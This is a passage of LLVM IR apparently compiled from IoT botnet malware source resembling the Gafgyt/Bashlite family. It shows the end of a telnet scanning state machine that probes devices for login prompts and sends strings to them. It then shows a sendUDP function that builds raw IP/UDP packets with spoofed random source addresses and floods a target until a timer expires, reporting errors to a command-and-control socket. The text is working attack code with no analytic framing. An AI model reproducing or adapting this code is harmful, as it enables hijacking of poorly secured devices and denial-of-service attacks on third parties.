  call void @llvm.memset.p0i8.i64(i8* align 1 %1688, i8 0, i64 1024, i1 false)
  br label %1950

1689:                                             ; preds = %1595
  %1690 = load i32, i32* %2, align 4
  %1691 = sext i32 %1690 to i64
  %1692 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1691
  %1693 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1692, i32 0, i32 0
  %1694 = load i32, i32* %1693, align 16
  %1695 = load i32, i32* %2, align 4
  %1696 = sext i32 %1695 to i64
  %1697 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1696
  %1698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1697, i32 0, i32 8
  %1699 = load i8*, i8** %1698, align 8
  %1700 = load i32, i32* %2, align 4
  %1701 = sext i32 %1700 to i64
  %1702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1701
  %1703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1702, i32 0, i32 7
  %1704 = load i16, i16* %1703, align 16
  %1705 = zext i16 %1704 to i32
  %1706 = call i32 @readUntil(i32 noundef %1694, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0), i32 noundef 1, i32 noundef 0, i32 noundef 10000, i8* noundef %1699, i32 noundef 1024, i32 noundef %1705)
  %1707 = icmp ne i32 %1706, 0
  br i1 %1707, label %1708, label %1783

1708:                                             ; preds = %1689
  %1709 = load i32, i32* %2, align 4
  %1710 = sext i32 %1709 to i64
  %1711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1710
  %1712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1711, i32 0, i32 6
  store i32 0, i32* %1712, align 4
  %1713 = load i32, i32* %2, align 4
  %1714 = sext i32 %1713 to i64
  %1715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1714
  %1716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1715, i32 0, i32 7
  store i16 0, i16* %1716, align 16
  %1717 = load i32, i32* %2, align 4
  %1718 = sext i32 %1717 to i64
  %1719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1718
  %1720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1719, i32 0, i32 8
  %1721 = load i8*, i8** %1720, align 8
  %1722 = call i8* @strstr(i8* noundef %1721, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i64 0, i64 0)) #11
  %1723 = icmp ne i8* %1722, null
  br i1 %1723, label %1724, label %1744

1724:                                             ; preds = %1708
  %1725 = load i32, i32* %2, align 4
  %1726 = sext i32 %1725 to i64
  %1727 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1726
  %1728 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1727, i32 0, i32 8
  %1729 = load i8*, i8** %1728, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1729, i8 0, i64 1024, i1 false)
  %1730 = load i32, i32* %2, align 4
  %1731 = sext i32 %1730 to i64
  %1732 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1731
  %1733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1732, i32 0, i32 0
  %1734 = load i32, i32* %1733, align 16
  %1735 = call i32 @sclose(i32 noundef %1734)
  %1736 = load i32, i32* %2, align 4
  %1737 = sext i32 %1736 to i64
  %1738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1737
  %1739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1738, i32 0, i32 2
  store i8 0, i8* %1739, align 8
  %1740 = load i32, i32* %2, align 4
  %1741 = sext i32 %1740 to i64
  %1742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1741
  %1743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1742, i32 0, i32 3
  store i8 0, i8* %1743, align 1
  br label %1950

1744:                                             ; preds = %1708
  %1745 = load i32, i32* %2, align 4
  %1746 = sext i32 %1745 to i64
  %1747 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1746
  %1748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1747, i32 0, i32 8
  %1749 = load i8*, i8** %1748, align 8
  %1750 = call i32 @matchPrompt(i8* noundef %1749)
  %1751 = icmp ne i32 %1750, 0
  br i1 %1751, label %1772, label %1752

1752:                                             ; preds = %1744
  %1753 = load i32, i32* %2, align 4
  %1754 = sext i32 %1753 to i64
  %1755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1754
  %1756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1755, i32 0, i32 8
  %1757 = load i8*, i8** %1756, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1757, i8 0, i64 1024, i1 false)
  %1758 = load i32, i32* %2, align 4
  %1759 = sext i32 %1758 to i64
  %1760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1759
  %1761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1760, i32 0, i32 0
  %1762 = load i32, i32* %1761, align 16
  %1763 = call i32 @sclose(i32 noundef %1762)
  %1764 = load i32, i32* %2, align 4
  %1765 = sext i32 %1764 to i64
  %1766 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1765
  %1767 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1766, i32 0, i32 2
  store i8 0, i8* %1767, align 8
  %1768 = load i32, i32* %2, align 4
  %1769 = sext i32 %1768 to i64
  %1770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1769
  %1771 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1770, i32 0, i32 3
  store i8 1, i8* %1771, align 1
  br label %1950

1772:                                             ; preds = %1744
  %1773 = load i32, i32* %2, align 4
  %1774 = sext i32 %1773 to i64
  %1775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1774
  %1776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1775, i32 0, i32 2
  store i8 7, i8* %1776, align 8
  br label %1777

1777:                                             ; preds = %1772
  %1778 = load i32, i32* %2, align 4
  %1779 = sext i32 %1778 to i64
  %1780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1779
  %1781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1780, i32 0, i32 8
  %1782 = load i8*, i8** %1781, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1782, i8 0, i64 1024, i1 false)
  br label %1950

1783:                                             ; preds = %1689
  %1784 = load i32, i32* %2, align 4
  %1785 = sext i32 %1784 to i64
  %1786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1785
  %1787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1786, i32 0, i32 8
  %1788 = load i8*, i8** %1787, align 8
  %1789 = call i64 @strlen(i8* noundef %1788) #11
  %1790 = trunc i64 %1789 to i16
  %1791 = load i32, i32* %2, align 4
  %1792 = sext i32 %1791 to i64
  %1793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1792
  %1794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1793, i32 0, i32 7
  store i16 %1790, i16* %1794, align 16
  br label %1795

1795:                                             ; preds = %1783
  br label %1796

1796:                                             ; preds = %1795
  br label %1797

1797:                                             ; preds = %1796
  br label %1798

1798:                                             ; preds = %1797
  br label %1799

1799:                                             ; preds = %1798
  br label %1800

1800:                                             ; preds = %1799
  br label %1801

1801:                                             ; preds = %1800
  br label %1802

1802:                                             ; preds = %1801
  %1803 = load i32, i32* %2, align 4
  %1804 = sext i32 %1803 to i64
  %1805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1804
  %1806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1805, i32 0, i32 6
  %1807 = load i32, i32* %1806, align 4
  %1808 = add i32 %1807, 10
  %1809 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %1810 = icmp ult i32 %1808, %1809
  br i1 %1810, label %1811, label %1826

1811:                                             ; preds = %1802
  %1812 = load i32, i32* %2, align 4
  %1813 = sext i32 %1812 to i64
  %1814 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1813
  %1815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1814, i32 0, i32 0
  %1816 = load i32, i32* %1815, align 16
  %1817 = call i32 @sclose(i32 noundef %1816)
  %1818 = load i32, i32* %2, align 4
  %1819 = sext i32 %1818 to i64
  %1820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1819
  %1821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1820, i32 0, i32 2
  store i8 0, i8* %1821, align 8
  %1822 = load i32, i32* %2, align 4
  %1823 = sext i32 %1822 to i64
  %1824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1823
  %1825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1824, i32 0, i32 3
  store i8 1, i8* %1825, align 1
  br label %1826

1826:                                             ; preds = %1811, %1802
  br label %1949

1827:                                             ; preds = %69
  %1828 = load i32, i32* %2, align 4
  %1829 = sext i32 %1828 to i64
  %1830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1829
  %1831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1830, i32 0, i32 0
  %1832 = load i32, i32* %1831, align 16
  %1833 = call i64 @send(i32 noundef %1832, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0), i64 noundef 4, i32 noundef 16384)
  %1834 = icmp slt i64 %1833, 0
  br i1 %1834, label %1835, label %1850

1835:                                             ; preds = %1827
  %1836 = load i32, i32* %2, align 4
  %1837 = sext i32 %1836 to i64
  %1838 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1837
  %1839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1838, i32 0, i32 0
  %1840 = load i32, i32* %1839, align 16
  %1841 = call i32 @sclose(i32 noundef %1840)
  %1842 = load i32, i32* %2, align 4
  %1843 = sext i32 %1842 to i64
  %1844 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1843
  %1845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1844, i32 0, i32 2
  store i8 0, i8* %1845, align 8
  %1846 = load i32, i32* %2, align 4
  %1847 = sext i32 %1846 to i64
  %1848 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1847
  %1849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1848, i32 0, i32 3
  store i8 1, i8* %1849, align 1
  br label %1950

1850:                                             ; preds = %1827
  %1851 = load i32, i32* %2, align 4
  %1852 = sext i32 %1851 to i64
  %1853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1852
  %1854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1853, i32 0, i32 2
  store i8 8, i8* %1854, align 8
  br label %1949

1855:                                             ; preds = %69
  %1856 = load i32, i32* %2, align 4
  %1857 = sext i32 %1856 to i64
  %1858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1857
  %1859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1858, i32 0, i32 0
  %1860 = load i32, i32* %1859, align 16
  %1861 = call i64 @send(i32 noundef %1860, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.43, i64 0, i64 0), i64 noundef 9, i32 noundef 16384)
  %1862 = icmp slt i64 %1861, 0
  br i1 %1862, label %1863, label %1878

1863:                                             ; preds = %1855
  %1864 = load i32, i32* %2, align 4
  %1865 = sext i32 %1864 to i64
  %1866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1865
  %1867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1866, i32 0, i32 0
  %1868 = load i32, i32* %1867, align 16
  %1869 = call i32 @sclose(i32 noundef %1868)
  %1870 = load i32, i32* %2, align 4
  %1871 = sext i32 %1870 to i64
  %1872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1871
  %1873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1872, i32 0, i32 2
  store i8 0, i8* %1873, align 8
  %1874 = load i32, i32* %2, align 4
  %1875 = sext i32 %1874 to i64
  %1876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1875
  %1877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1876, i32 0, i32 3
  store i8 1, i8* %1877, align 1
  br label %1950

1878:                                             ; preds = %1855
  %1879 = load i32, i32* %2, align 4
  %1880 = sext i32 %1879 to i64
  %1881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1880
  %1882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1881, i32 0, i32 2
  store i8 9, i8* %1882, align 8
  br label %1949

1883:                                             ; preds = %69
  %1884 = load i32, i32* %2, align 4
  %1885 = sext i32 %1884 to i64
  %1886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1885
  %1887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1886, i32 0, i32 6
  %1888 = load i32, i32* %1887, align 4
  %1889 = icmp eq i32 %1888, 0
  br i1 %1889, label %1890, label %1896

1890:                                             ; preds = %1883
  %1891 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %1892 = load i32, i32* %2, align 4
  %1893 = sext i32 %1892 to i64
  %1894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1893
  %1895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1894, i32 0, i32 6
  store i32 %1891, i32* %1895, align 4
  br label %1896

1896:                                             ; preds = %1890, %1883
  %1897 = load i32, i32* %2, align 4
  %1898 = sext i32 %1897 to i64
  %1899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1898
  %1900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1899, i32 0, i32 0
  %1901 = load i32, i32* %1900, align 16
  %1902 = call i64 @send(i32 noundef %1901, i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.44, i64 0, i64 0), i64 noundef 194, i32 noundef 16384)
  %1903 = icmp slt i64 %1902, 0
  br i1 %1903, label %1904, label %1924

1904:                                             ; preds = %1896
  %1905 = load i32, i32* %2, align 4
  %1906 = sext i32 %1905 to i64
  %1907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1906
  %1908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1907, i32 0, i32 0
  %1909 = load i32, i32* %1908, align 16
  %1910 = call i32 @sclose(i32 noundef %1909)
  %1911 = load i32, i32* %2, align 4
  %1912 = sext i32 %1911 to i64
  %1913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1912
  %1914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1913, i32 0, i32 2
  store i8 0, i8* %1914, align 8
  %1915 = load i32, i32* %2, align 4
  %1916 = sext i32 %1915 to i64
  %1917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1916
  %1918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1917, i32 0, i32 3
  store i8 1, i8* %1918, align 1
  %1919 = load i32, i32* %2, align 4
  %1920 = sext i32 %1919 to i64
  %1921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1920
  %1922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1921, i32 0, i32 8
  %1923 = load i8*, i8** %1922, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1923, i8 0, i64 1024, i1 false)
  br label %1950

1924:                                             ; preds = %1896
  %1925 = load i32, i32* %2, align 4
  %1926 = sext i32 %1925 to i64
  %1927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1926
  %1928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1927, i32 0, i32 6
  %1929 = load i32, i32* %1928, align 4
  %1930 = add i32 %1929, 10
  %1931 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %1932 = icmp ult i32 %1930, %1931
  br i1 %1932, label %1933, label %1948

1933:                                             ; preds = %1924
  %1934 = load i32, i32* %2, align 4
  %1935 = sext i32 %1934 to i64
  %1936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1935
  %1937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1936, i32 0, i32 0
  %1938 = load i32, i32* %1937, align 16
  %1939 = call i32 @sclose(i32 noundef %1938)
  %1940 = load i32, i32* %2, align 4
  %1941 = sext i32 %1940 to i64
  %1942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1941
  %1943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1942, i32 0, i32 2
  store i8 0, i8* %1943, align 8
  %1944 = load i32, i32* %2, align 4
  %1945 = sext i32 %1944 to i64
  %1946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %33, i64 %1945
  %1947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1946, i32 0, i32 3
  store i8 1, i8* %1947, align 1
  br label %1948

1948:                                             ; preds = %1933, %1924
  br label %1949

1949:                                             ; preds = %1948, %1878, %1850, %1826, %1013, %949, %601, %537, %380, %218, %69
  br label %1950

1950:                                             ; preds = %1949, %1904, %1863, %1835, %1777, %1752, %1724, %1683, %1658, %1630, %1589, %1564, %1536, %1495, %1470, %1442, %1401, %1376, %1348, %1307, %1282, %1254, %1213, %1188, %1160, %1119, %1094, %1066, %998, %975, %890, %867, %844, %821, %798, %775, %752, %729, %715, %664, %586, %563, %490, %439, %305, %171, %141
  %1951 = load i32, i32* %2, align 4
  %1952 = add nsw i32 %1951, 1
  store i32 %1952, i32* %2, align 4
  br label %65, !llvm.loop !46

1953:                                             ; preds = %65
  br label %63
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendUDP(i8* noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i64, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = load i32, i32* %8, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %36

32:                                               ; preds = %6
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %41

36:                                               ; preds = %6
  %37 = load i32, i32* %8, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 noundef zeroext %38) #15
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %41

41:                                               ; preds = %36, %32
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %44 = call i32 @getHost(i8* noundef %42, %struct.in_addr* noundef %43)
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %47

46:                                               ; preds = %41
  br label %270

47:                                               ; preds = %41
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %49, i8 0, i64 8, i1 false)
  %50 = load i32, i32* %12, align 4
  store i32 %50, i32* %14, align 4
  %51 = load i32, i32* %10, align 4
  %52 = icmp eq i32 %51, 32
  br i1 %52, label %53, label %105

53:                                               ; preds = %47
  %54 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 17) #12
  store i32 %54, i32* %15, align 4
  %55 = load i32, i32* %15, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %60, label %57

57:                                               ; preds = %53
  %58 = load i32, i32* @mainCommSock, align 4
  %59 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %58, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i64 0, i64 0))
  br label %270

60:                                               ; preds = %53
  %61 = load i32, i32* %11, align 4
  %62 = add nsw i32 %61, 1
  %63 = sext i32 %62 to i64
  %64 = call noalias i8* @malloc(i64 noundef %63) #12
  store i8* %64, i8** %16, align 8
  %65 = load i8*, i8** %16, align 8
  %66 = icmp eq i8* %65, null
  br i1 %66, label %67, label %68

67:                                               ; preds = %60
  br label %270

68:                                               ; preds = %60
  %69 = load i8*, i8** %16, align 8
  %70 = load i32, i32* %11, align 4
  %71 = add nsw i32 %70, 1
  %72 = sext i32 %71 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %69, i8 0, i64 %72, i1 false)
  %73 = load i8*, i8** %16, align 8
  %74 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* noundef %73, i32 noundef %74)
  %75 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %76 = load i32, i32* %9, align 4
  %77 = add nsw i32 %75, %76
  store i32 %77, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %78

78:                                               ; preds = %101, %100, %68
  %79 = load i32, i32* %15, align 4
  %80 = load i8*, i8** %16, align 8
  %81 = load i32, i32* %11, align 4
  %82 = sext i32 %81 to i64
  %83 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %84 = call i64 @sendto(i32 noundef %79, i8* noundef %80, i64 noundef %82, i32 noundef 0, %struct.sockaddr* noundef %83, i32 noundef 16)
  %85 = load i32, i32* %18, align 4
  %86 = load i32, i32* %14, align 4
  %87 = icmp eq i32 %85, %86
  br i1 %87, label %88, label %101

88:                                               ; preds = %78
  %89 = load i32, i32* %8, align 4
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %95

91:                                               ; preds = %88
  %92 = call i32 @rand_cmwc()
  %93 = trunc i32 %92 to i16
  %94 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %93, i16* %94, align 2
  br label %95

95:                                               ; preds = %91, %88
  %96 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %97 = load i32, i32* %17, align 4
  %98 = icmp sgt i32 %96, %97
  br i1 %98, label %99, label %100

99:                                               ; preds = %95
  br label %104

100:                                              ; preds = %95
  store i32 0, i32* %18, align 4
  br label %78

101:                                              ; preds = %78
  %102 = load i32, i32* %18, align 4
  %103 = add i32 %102, 1
  store i32 %103, i32* %18, align 4
  br label %78

104:                                              ; preds = %99
  br label %270

105:                                              ; preds = %47
  %106 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #12
  store i32 %106, i32* %19, align 4
  %107 = load i32, i32* %19, align 4
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %112, label %109

109:                                              ; preds = %105
  %110 = load i32, i32* @mainCommSock, align 4
  %111 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %110, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i64 0, i64 0))
  br label %270

112:                                              ; preds = %105
  store i32 1, i32* %20, align 4
  %113 = load i32, i32* %19, align 4
  %114 = bitcast i32* %20 to i8*
  %115 = call i32 @setsockopt(i32 noundef %113, i32 noundef 0, i32 noundef 3, i8* noundef %114, i32 noundef 4) #12
  %116 = icmp slt i32 %115, 0
  br i1 %116, label %117, label %120

117:                                              ; preds = %112
  %118 = load i32, i32* @mainCommSock, align 4
  %119 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %118, i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i64 0, i64 0))
  br label %270

120:                                              ; preds = %112
  store i32 50, i32* %21, align 4
  br label %121

121:                                              ; preds = %125, %120
  %122 = load i32, i32* %21, align 4
  %123 = add nsw i32 %122, -1
  store i32 %123, i32* %21, align 4
  %124 = icmp ne i32 %122, 0
  br i1 %124, label %125, label %130

125:                                              ; preds = %121
  %126 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %127 = call i32 @rand_cmwc()
  %128 = xor i32 %126, %127
  call void @srand(i32 noundef %128) #12
  %129 = call i32 @rand() #12
  call void @init_rand(i32 noundef %129)
  br label %121, !llvm.loop !47

130:                                              ; preds = %121
  %131 = load i32, i32* %10, align 4
  %132 = icmp eq i32 %131, 0
  br i1 %132, label %133, label %134

133:                                              ; preds = %130
  store i32 0, i32* %22, align 4
  br label %140

134:                                              ; preds = %130
  %135 = load i32, i32* %10, align 4
  %136 = sub nsw i32 32, %135
  %137 = shl i32 1, %136
  %138 = sub nsw i32 %137, 1
  %139 = xor i32 %138, -1
  store i32 %139, i32* %22, align 4
  br label %140

140:                                              ; preds = %134, %133
  %141 = load i32, i32* %11, align 4
  %142 = sext i32 %141 to i64
  %143 = add i64 28, %142
  %144 = call i8* @llvm.stacksave()
  store i8* %144, i8** %23, align 8
  %145 = alloca i8, i64 %143, align 16
  store i64 %143, i64* %24, align 8
  %146 = bitcast i8* %145 to %struct.iphdr*
  store %struct.iphdr* %146, %struct.iphdr** %25, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = getelementptr i8, i8* %148, i64 20
  %150 = bitcast i8* %149 to %struct.udphdr*
  store %struct.udphdr* %150, %struct.udphdr** %26, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 4
  %155 = load i32, i32* %22, align 4
  %156 = call i32 @getRandomIP(i32 noundef %155)
  %157 = call i32 @htonl(i32 noundef %156) #15
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = add i64 8, %159
  %161 = trunc i64 %160 to i32
  call void @makeIPPacket(%struct.iphdr* noundef %151, i32 noundef %154, i32 noundef %157, i8 noundef zeroext 17, i32 noundef %161)
  %162 = load i32, i32* %11, align 4
  %163 = sext i32 %162 to i64
  %164 = add i64 8, %163
  %165 = trunc i64 %164 to i16
  %166 = call zeroext i16 @htons(i16 noundef zeroext %165) #15
  %167 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %168 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %167, i32 0, i32 0
  %169 = bitcast %union.anon.2* %168 to %struct.anon.3*
  %170 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %169, i32 0, i32 2
  store i16 %166, i16* %170, align 2
  %171 = call i32 @rand_cmwc()
  %172 = trunc i32 %171 to i16
  %173 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %174 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %173, i32 0, i32 0
  %175 = bitcast %union.anon.2* %174 to %struct.anon.3*
  %176 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %175, i32 0, i32 0
  store i16 %172, i16* %176, align 2
  %177 = load i32, i32* %8, align 4
  %178 = icmp eq i32 %177, 0
  br i1 %178, label %179, label %181

179:                                              ; preds = %140
  %180 = call i32 @rand_cmwc()
  br label %186

181:                                              ; preds = %140
  %182 = load i32, i32* %8, align 4
  %183 = trunc i32 %182 to i16
  %184 = call zeroext i16 @htons(i16 noundef zeroext %183) #15
  %185 = zext i16 %184 to i32
  br label %186

186:                                              ; preds = %181, %179
  %187 = phi i32 [ %180, %179 ], [ %185, %181 ]
  %188 = trunc i32 %187 to i16
  %189 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %190 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %189, i32 0, i32 0
  %191 = bitcast %union.anon.2* %190 to %struct.anon.3*
  %192 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %191, i32 0, i32 1
  store i16 %188, i16* %192, align 2
  %193 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %194 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %193, i32 0, i32 0
  %195 = bitcast %union.anon.2* %194 to %struct.anon.3*
